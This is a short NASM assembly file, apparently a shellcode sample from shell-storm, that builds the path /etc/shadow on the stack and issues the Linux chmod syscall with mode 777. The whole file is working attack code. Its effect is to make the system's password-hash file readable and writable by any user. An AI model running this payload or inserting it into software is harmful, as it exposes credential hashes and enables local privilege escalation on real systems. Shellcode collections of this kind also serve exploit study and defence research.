; chmod_shadow.nasm
; From shellstorm sample: http://shell-storm.org/shellcode/files/shellcode-875.php


global _start

section .text
_start:

    xor eax, eax
    mov ecx, eax

    push 0x23776f64         ; '#wod'
    push 0x6168732f         ; 'ahs/'
    push 0x6374652f         ; 'cte/'
    mov byte [esp+11], al   ; replace '#' with \0
    mov ebx, esp            ; pointer to pathname
    mov word cx, 0x1ff      ; set mode to 777
    mov al, 0xf             ; chmod syscall
    int 0x80
